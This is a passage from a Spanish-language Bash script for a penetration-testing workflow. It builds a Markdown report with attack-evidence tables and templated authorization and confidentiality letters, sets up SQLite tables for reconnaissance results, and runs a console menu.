    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Evidencia de ataque exitoso}} \\ \hline' >> $dir/Reporte/Reporte.md 
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Evidencia de ataque exitoso}} \\ \hline' >> $dir/Reporte/Reporte.md 
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md
    cat $dir/Reporte/msf.txt >> $dir/Reporte/Reporte.md
    printf '%s' '\newpage' >> $dir/Reporte/Reporte.md
  fi

}

_repAutorizacion(){
  dia=$(date "+%d")
  mes=$(date "+%m")
  anyo=$(date "+%Y")

  case $mes in
    01)
      mes="Enero"
      ;;
    02)
      mes="Febrero"
      ;;
    03)
      mes="Marzo"
      ;;
    04)
      mes="Abril"
      ;;
    05)
      mes="Mayo"
      ;;
    06)
      mes="Junio"
      ;;
    07)
      mes="Julio"
      ;;
    08)
      mes="Agosto"
      ;;
    09)
      mes="Septiembre"
      ;;
    10)
      mes="Octubre"
      ;;
    11)
      mes="Noviembre"
      ;;
    12)
      mes="Diciembre"
      ;;
  esac

  fechaRep=$(echo $dia" de "$mes" de "$anyo)

  echo "\n\n# Autorización" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "Cliente: [Nombre de la Empresa u Organización]  " >> $dir/Reporte/Reporte.md
  echo "Nombre: [Nombre de la persona solicitante del informe]  " >> $dir/Reporte/Reporte.md
  echo "Puesto: [Puesto de la persona solicitante del informe]  " >> $dir/Reporte/Reporte.md
  echo "Fecha:" $fechaRep "  ">> $dir/Reporte/Reporte.md
  echo "Asunto: Evaluación de vulnerabilidades y Autorización del proceso de Pentesting  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "## Descripción de las Pruebas" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "Las pruebas de penetración involucrarán un análisis exhaustivo de nuestra infraestructura de tecnología de la información, incluyendo sistemas, aplicaciones, redes y dispositivos relacionados. El objetivo es identificar debilidades en la seguridad y evaluar la resistencia de nuestros sistemas ante posibles amenazas cibernéticas." >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "## Equipo Responsable" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "Las pruebas de penetración serán realizadas por un equipo de expertos en seguridad cibernética debidamente autorizados y certificados. Este equipo estará liderado por [Nombre del Líder del Equipo], quien cuenta con una amplia experiencia en pruebas de penetración y está comprometido con el cumplimiento de altos estándares éticos y legales." >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "## Compromiso de No Causar Daños" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "Entiendo que las pruebas de penetración pueden causar interrupciones temporales en nuestros sistemas y redes. Sin embargo, se espera que el equipo de pruebas minimice cualquier impacto negativo y notifique de inmediato cualquier incidente o daño accidental que pueda ocurrir durante el proceso." >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  printf '%s' '\vfill  ' >> $dir/Reporte/Reporte.md 
  echo "Firma: ___________________________ Firma:___________________________  " >> $dir/Reporte/Reporte.md
  echo "[Nombre de la persona que autoriza][Nombre del Líder del Equipo Responsable]  " >> $dir/Reporte/Reporte.md
  echo "[Título de la persona que autoriza][Título del Líder del Equipo Responsable]  " >> $dir/Reporte/Reporte.md
  printf '%s' '\newpage' >> $dir/Reporte/Reporte.md
}

_repConfidencialidad(){
  dia=$(date "+%d")
  mes=$(date "+%m")
  anyo=$(date "+%Y")

  case $mes in
    01)
      mes="Enero"
      ;;
    02)
      mes="Febrero"
      ;;
    03)
      mes="Marzo"
      ;;
    04)
      mes="Abril"
      ;;
    05)
      mes="Mayo"
      ;;
    06)
      mes="Junio"
      ;;
    07)
      mes="Julio"
      ;;
    08)
      mes="Agosto"
      ;;
    09)
      mes="Septiembre"
      ;;
    10)
      mes="Octubre"
      ;;
    11)
      mes="Noviembre"
      ;;
    12)
      mes="Diciembre"
      ;;
  esac

  fechaRep=$(echo $dia" de "$mes" de "$anyo)

  echo "\n\n# Manifiesto de Confidencialidad para Pruebas de Penetración  " >> $dir/Reporte/Reporte.md
  echo "En [Nombre de la Empresa u Organización], reconocemos la importancia crítica de la seguridad de nuestros sistemas y redes de información. Para garantizar la integridad y confidencialidad de nuestros activos digitales, hemos decidido llevar a cabo pruebas de penetración. Este manifiesto de confidencialidad establece los principios y compromisos que guiarán todas las actividades relacionadas con estas pruebas.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  echo "## 1. Propósito y Alcance  " >> $dir/Reporte/Reporte.md
  echo "Las pruebas de penetración se llevarán a cabo con el único propósito de evaluar y mejorar la seguridad de nuestros sistemas y redes de información. Estas pruebas se realizarán dentro del alcance definido y autorizado previamente.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  
  echo "## 2. Confidencialidad Absoluta  " >> $dir/Reporte/Reporte.md
  echo "Todas las actividades y resultados de las pruebas de penetración se considerarán información altamente confidencial. Esto incluye cualquier dato, hallazgo, documento, informe o acceso a sistemas que se obtenga durante el proceso de pruebas.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md

  echo "## 3. Acceso Autorizado  " >> $dir/Reporte/Reporte.md
  echo "El equipo de pruebas de penetración, debidamente autorizado, será el único responsable de llevar a cabo las pruebas. Se compromete a no divulgar, compartir ni utilizar de manera indebida ninguna información o acceso obtenido durante las pruebas.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md

  echo "## 4. Protección de Datos Sensibles  " >> $dir/Reporte/Reporte.md
  echo "En el caso de que se identifiquen datos sensibles o información crítica durante las pruebas, el equipo de pruebas se compromete a informar de inmediato a [Nombre del Responsable de Seguridad o Equipo de Respuesta a Incidentes] para que se tomen medidas adecuadas para su protección y mitigación de riesgos.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md

  echo "## 5. Cumplimiento Legal y Ético  " >> $dir/Reporte/Reporte.md
  echo "Todas las actividades de pruebas de penetración se llevarán a cabo de acuerdo con las leyes y regulaciones locales, nacionales e internacionales aplicables. Además, se seguirán las mejores prácticas éticas y profesionales en todo momento.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md

  echo "## 6. Retención de Información  " >> $dir/Reporte/Reporte.md
  echo "Una vez finalizadas las pruebas de penetración, se retendrán todos los datos y resultados durante el período especificado en el acuerdo de pruebas. Pasado ese tiempo, se eliminará toda la información obtenida durante las pruebas de manera segura y de acuerdo con las políticas de retención de datos de la empresa.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md

  echo "## 7. Responsabilidad y Supervisión  " >> $dir/Reporte/Reporte.md
  echo "El [Nombre del Responsable de Seguridad o Equipo de Respuesta a Incidentes] supervisará y garantizará el cumplimiento de este manifiesto de confidencialidad en todas las etapas de las pruebas de penetración.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md
  
  echo "## 8. Compromiso de Cumplimiento  " >> $dir/Reporte/Reporte.md
  echo "Al firmar este manifiesto de confidencialidad, todos los miembros del equipo de pruebas de penetración se comprometen a cumplir con estos principios y compromisos en todo momento. Cualquier violación de este manifiesto se considerará una infracción grave y será tratada de acuerdo con las políticas y regulaciones de la empresa.  " >> $dir/Reporte/Reporte.md
  echo "\n" >> $dir/Reporte/Reporte.md

  echo "Fecha y Firma: "$fechaRep"  " >> $dir/Reporte/Reporte.md
  echo "[Firma del Miembro del Equipo de Pruebas de Penetración]  " >> $dir/Reporte/Reporte.md
  echo "[Nombre del Miembro del Equipo de Pruebas de Penetración]  " >> $dir/Reporte/Reporte.md
  echo "[Nombre de la Empresa u Organización]  " >> $dir/Reporte/Reporte.md
  #echo "Este manifiesto de confidencialidad es un documento fundamental para garantizar la protección de la información y la integridad de las pruebas de penetración. Todos los involucrados deben leer, comprender y cumplir con estos principios antes de iniciar cualquier actividad relacionada con pruebas de penetración.  " >> $dir/Reporte/Reporte.md
}

_initBDD()
{
 sqlite3 $dir/BDD.db 'CREATE TABLE IF NOT EXISTS T_METAGOOF(DOCUMENTO TEXT);' 2>/dev/null
 sqlite3 $dir/BDD.db 'CREATE TABLE IF NOT EXISTS T_THEHARVEST(TIPO TEXT,DOCUMENTO TEXT);' 2>/dev/null

 sqlite3 $dir/BDD.db 'CREATE TABLE IF NOT EXISTS T_NMAP(PUERTO INT,INFO TEXT);' 2>/dev/null
}

_truncBDD(){
  sqlite3 $dir/BDD.db 'DELETE FROM T_METAGOOF;' 2>/dev/null
  sqlite3 $dir/BDD.db 'DELETE FROM T_THEHARVEST;' 2>/dev/null
  sqlite3 $dir/BDD.db 'DELETE FROM T_NMAP;' 2>/dev/null
}
 
# opcion por defecto
opc="0"
 
# bucle mientas la opcion indicada sea diferente de 9 (salir)
until [ "$opc" -eq "9" ];
do
  #read opc
    case $opc in
        1)
            _mostrarResultado $opc
            _menu
            ;;
        2)
            _mostrarResultado $opc
            _menu
            ;;
        3)
            _mostrarResultado $opc
            _menu
            ;;
        4)
            _mostrarResultado $opc
            _menu
            ;;
        5)
            _mostrarResultado $opc
            _menu
            ;;
        6)
            _mostrarResultado $opc
            _menu
            ;;
        97)
            _mostrarResultado $opc
            _menu
            ;;
        98)
            _mostrarResultado $opc
            _menu
            ;;
        99)
            _mostrarResultado $opc
            _menu
            ;;
        *)
            # Esta opcion se ejecuta si no es ninguna de las anteriores
            #clear
            if [ "$opc" -ne "0" ]; then 
              _mostrarError 
            fi
            _menu
            ;;
    esac
    read opc
done


####################################################################

#REFERENCIAS:

# Codigo que muestra como gestionar un menu desde consola: http://www.lawebdelprogramador.com